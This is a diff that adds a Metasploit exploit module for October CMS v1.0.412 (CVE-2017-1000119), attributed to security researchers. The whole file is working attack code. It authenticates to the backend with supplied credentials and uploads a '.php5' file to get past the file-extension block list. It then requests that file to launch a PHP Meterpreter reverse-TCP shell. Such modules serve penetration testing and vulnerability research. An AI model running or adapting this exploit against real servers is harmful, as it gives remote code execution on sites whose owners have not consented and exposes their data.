@@ -1,0 +1,157 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'October CMS Upload Protection Bypass Code Execution',
+      'Description' => %q{
+          This module exploits an Authenticated user with permission to upload and manage media contents can
+          upload various files on the server. Application prevents the user from
+          uploading PHP code by checking the file extension. It uses black-list based
+          approach, as seen in octobercms/vendor/october/rain/src/Filesystem/
+          Definitions.php:blockedExtensions().
+          This module was tested on October CMS version v1.0.412 on Ubuntu.
+      },
+      'Author' =>
+        [
+          'Anti Räis', # Discovery
+          'Touhid M.Shaikh <touhidshaikh22[at]gmail.com>', # Metasploit Module
+          'SecureLayer7.net' # Metasploit Module
+        ],
+      'License' => MSF_LICENSE,
+      'References' =>
+        [
+          ['EDB','41936'],
+          ['URL','https://bitflipper.eu/finding/2017/04/october-cms-v10412-several-issues.html'],
+          ['CVE','2017-1000119']
+        ],
+      'DefaultOptions' =>
+        {
+          'SSL'     => false,
+          'PAYLOAD' => 'php/meterpreter/reverse_tcp',
+          'ENCODER' => 'php/base64',
+        },
+      'Privileged' => false,
+      'Platform'   => ['php'],
+      'Arch'       => ARCH_PHP,
+      'Targets' =>
+        [
+          [ 'October CMS v1.0.412', { } ],
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Apr 25 2017'))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [ true, "Base October CMS directory path", '/']),
+        OptString.new('USERNAME', [ true, "Username to authenticate with", 'admin']),
+        OptString.new('PASSWORD', [ true, "Password to authenticate with", 'admin'])
+      ])
+  end
+
+  def uri
+    return target_uri.path
+  end
+
+  def check
+    begin
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(uri, 'modules', 'system', 'assets', 'js', 'framework.js')
+      })
+    rescue
+      vprint_error('Unable to access the /assets/js/framework.js file')
+      return CheckCode::Unknown
+    end
+
+    if res && res.code == 200
+      return Exploit::CheckCode::Appears
+    end
+
+    return CheckCode::Safe
+  end
+
+  def login
+    res = send_request_cgi({
+      'uri' => normalize_uri(uri, 'backend', 'backend', 'auth', 'signin'),
+      'method' => 'GET'
+    })
+
+    if res.nil?
+      fail_with(Failure::Unreachable, "#{peer} - Connection failed")
+    end
+
+    /name="_session_key" type="hidden" value="(?<session>[A-Za-z0-9"]+)">/ =~ res.body
+    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine Session Key") if session.nil?
+
+    /name="_token" type="hidden" value="(?<token>[A-Za-z0-9"]+)">/ =~ res.body
+    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine token") if token.nil?
+    vprint_good("Token for login : #{token}")
+    vprint_good("Session Key for login : #{session}")
+
+    cookies = res.get_cookies
+    vprint_status('Trying to Login ......')
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(uri, 'backend', 'backend', 'auth', 'signin'),
+      'cookie' => cookies,
+      'vars_post' => Hash[{
+        '_session_key' => session,
+        '_token' => token,
+        'postback' => '1',
+        'login' => datastore['USERNAME'],
+        'password' => datastore['PASSWORD']
+      }.to_a.shuffle]
+    })
+
+    fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request") if res.nil?
+
+    # if we redirect. then we assume we have authenticated cookie.
+    if res.code == 302
+      print_good("Authentication successful: #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])
+      return cookies
+    else
+      fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed :[ #{datastore['USERNAME']}:#{datastore['PASSWORD']} ]")
+    end
+  end
+
+
+  def exploit
+    cookies = login
+
+    evil = "<?php #{payload.encoded} ?>"
+    payload_name = "#{rand_text_alpha(8..13)}.php5"
+
+    post_data = Rex::MIME::Message.new
+    post_data.add_part("/", content_type = nil, transfer_encoding = nil, content_disposition = 'form-data; name="path"')
+    post_data.add_part(evil, content_type = 'application/x-php', transfer_encoding = nil, content_disposition = "form-data; name=\"file_data\"; filename=\"#{payload_name}")  #payload
+    data = post_data.to_s
+
+    register_files_for_cleanup(payload_name)
+    vprint_status("Trying to upload malicious #{payload_name} file ....")
+    res = send_request_cgi({
+      'uri' => normalize_uri(uri, 'backend', 'cms', 'media'),
+      'method' => 'POST',
+      'cookie' => cookies,
+      'headers' => { 'X-OCTOBER-FILEUPLOAD' => 'MediaManager-manager' },
+      'Connection' => 'close',
+      'data' => data,
+      'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
+    })
+
+    send_request_cgi({
+      'uri' => normalize_uri(uri, 'storage', 'app', 'media', payload_name),
+      'method' => 'GET'
+    })
+  end
+end
